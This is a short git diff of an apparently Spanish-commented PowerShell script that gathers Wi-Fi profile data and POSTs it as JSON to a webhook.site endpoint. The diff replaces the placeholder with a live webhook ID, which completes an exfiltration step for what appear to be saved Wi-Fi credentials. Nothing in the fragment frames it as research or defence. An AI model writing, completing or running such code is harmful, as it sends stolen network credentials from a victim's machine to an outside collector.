@@ -16,7 +16,7 @@ $wifiData = foreach ($name in $profiles) {
 
 # 4. Convertir a JSON y enviar al Webhook
 # REEMPLAZA LA URL CON TU WEBHOOK ACTUAL
-$webhookUrl = "https://webhook.site/TU_ID_AQUI"
+$webhookUrl = "https://webhook.site/8fae434e-1ec5-4dce-94e3-d1bf51a78a9c"
 $payload = $wifiData | ConvertTo-Json
 
 Invoke-WebRequest -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json" -UseBasicParsing
